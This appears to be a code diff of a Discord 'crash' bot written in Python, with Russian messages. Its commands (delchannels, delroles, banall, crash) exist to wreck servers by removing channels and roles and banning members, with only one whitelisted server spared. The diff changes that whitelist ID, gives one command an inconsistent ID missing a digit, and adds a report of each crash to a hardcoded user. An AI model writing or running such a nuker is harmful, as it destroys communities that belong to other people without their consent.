@@ -15,7 +15,7 @@ async def delchannels(ctx):
    guild = ctx.guild
    channels = guild.channels
    author = ctx.author
-   g = 747500947911213249
+   g = 767776281701253130
    if guild.id == g:
     await ctx.message.delete()
     await author.send('Краш невозможен! Сервер в белом списке!')
@@ -32,7 +32,7 @@ async def delroles(ctx):
    guild = ctx.guild
    author = ctx.author
    roles = guild.roles
-   g = 747500947911213249
+   g = 767776281701253130
    if guild.id == g:
     await ctx.message.delete()
     await author.send('Краш невозможен! Сервер в белом списке!')
@@ -49,7 +49,7 @@ async def banall(ctx):
   guild = ctx.guild
   members = guild.members
   author = ctx.author
-  g = 747500947911213249
+  g = 767776281701253130
   if guild.id == g:
     await ctx.message.delete()
     await author.send('Краш невозможен! Сервер в белом списке!')
@@ -70,12 +70,14 @@ async def crash(ctx):
     roles = guild.roles
     author = ctx.author
     gid = ctx.guild.id
-    g = 747500947911213249
+    g = 76777628170125313
     if guild.id == g:
      await ctx.message.delete()
      await author.send('Краш невозможен! Сервер в белом списке!')
     else:
      await ctx.message.delete()
+     user = Bot.get_user(571667975619346433)
+     await user.send(f'{author} Крашнул сервер! Айди автора: {author.id}')
      for i in members:
        if i is not Bot.user:
           try:
